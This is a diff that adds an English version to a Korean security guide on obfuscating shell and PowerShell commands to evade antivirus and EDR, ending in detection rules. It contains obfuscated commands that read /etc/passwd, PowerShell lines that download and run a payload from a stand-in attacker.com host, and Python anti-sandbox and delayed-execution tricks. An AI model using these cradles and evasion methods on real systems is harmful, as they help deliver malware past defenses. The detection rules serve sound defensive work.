@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 셸 스크립트 난독화 및 탐지 우회
 
 ## 개요
@@ -410,3 +416,139 @@ rule Bash_Base64_Execution {
 # xxd 사용
 -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/xxd -k xxd_exec
 ```
+
+---
+
+<a name="english"></a>
+
+# Shell Script Obfuscation and Detection Evasion
+
+## Overview
+
+Various obfuscation techniques are used to bypass signatures detected by antivirus, EDR (Endpoint Detection and Response), SIEM, and other tools. Defenders must also understand these techniques to create effective detection rules.
+
+---
+
+## 1. Bash Obfuscation Techniques
+
+```bash
+# Technique 1: Variable insertion
+c\a\t /etc/passwd
+c${IFS}a${IFS}t /etc/passwd
+
+# Technique 2: Quoting and escaping
+'c'a't' /etc/passwd
+"c""a""t" /etc/passwd
+
+# Technique 3: Base64 encoding
+echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
+
+# Technique 4: Hex encoding
+echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
+
+# Technique 5: Variable indirection
+cmd="cat /etc/passwd"
+eval "$cmd"
+$SHELL -c "$cmd"
+
+# Technique 6: Command substitution
+$(printf "\x63\x61\x74") /etc/passwd
+
+# Combined (harder to detect)
+${IFS:0:1}e${IFS:0:1}v${IFS:0:1}a${IFS:0:1}l "${IFS:0:1}$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)"
+```
+
+---
+
+## 2. PowerShell Obfuscation
+
+```powershell
+# Technique 1: Alias
+iex (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
+
+# Technique 2: Case variation
+iEx (NeW-ObJeCt NeT.WeBcLiEnT).DoWnLoAdStRiNg('http://attacker.com/payload.ps1')
+
+# Technique 3: String splitting
+$a = 'Down'+'load'+'String'
+$b = (New-Object Net.WebClient).$a('http://attacker.com/payload.ps1')
+iex $b
+
+# Technique 4: Base64 encoding
+$enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/x.ps1')"))
+powershell -EncodedCommand $enc
+
+# Technique 5: Character array
+-join('I','E','X') # = IEX
+[char[]](73,69,88) -join '' # = IEX
+
+# Technique 6: Environment variable
+$env:ComSpec  # = C:\Windows\system32\cmd.exe
+```
+
+---
+
+## 3. AV/EDR Evasion Techniques
+
+```python
+#!/usr/bin/env python3
+"""AV evasion techniques demonstration (for educational purposes)"""
+
+# Technique 1: XOR encoding
+def xor_encode(payload: bytes, key: int = 0xAA) -> bytes:
+    return bytes(b ^ key for b in payload)
+
+# Technique 2: Delayed execution
+import time
+
+def time_delay_exec(payload_func, delay: int = 5):
+    """Execute after delay to avoid sandbox detection"""
+    time.sleep(delay)
+    return payload_func()
+
+# Technique 3: Environment checks (anti-sandbox)
+import platform
+import os
+
+def is_real_system() -> bool:
+    """Check if running on real system vs sandbox"""
+    checks = [
+        os.path.exists("/etc/passwd"),       # Unix system files exist
+        platform.node() != "sandbox",         # Not "sandbox" hostname
+        os.cpu_count() > 2,                   # More than 2 CPUs (real system)
+    ]
+    return all(checks)
+
+# Technique 4: Process hollowing (concept - Windows)
+# 1. Create suspended process
+# 2. Unmap memory of target process
+# 3. Write malicious payload
+# 4. Resume process
+```
+
+---
+
+## 4. Detection Rules for These Techniques
+
+```bash
+# SIEM/Sigma rules to detect obfuscation attempts
+
+# Detect base64 in command line
+# Sigma rule: powershell_base64_encoded_command.yml
+# logsource: product: windows, category: process_creation
+# detection:
+#   CommandLine|contains:
+#     - '-EncodedCommand'
+#     - '-enc '
+#     - 'FromBase64String'
+
+# Detect hex encoding in bash
+# Process audit rule
+-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/base64 -k base64_exec
+
+# Detect eval usage (via bash -c)
+-a always,exit -F arch=b64 -S execve -F exe=/bin/bash \
+  -F arg1=-c -k bash_eval
+
+# Detect xxd usage
+-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/xxd -k xxd_exec
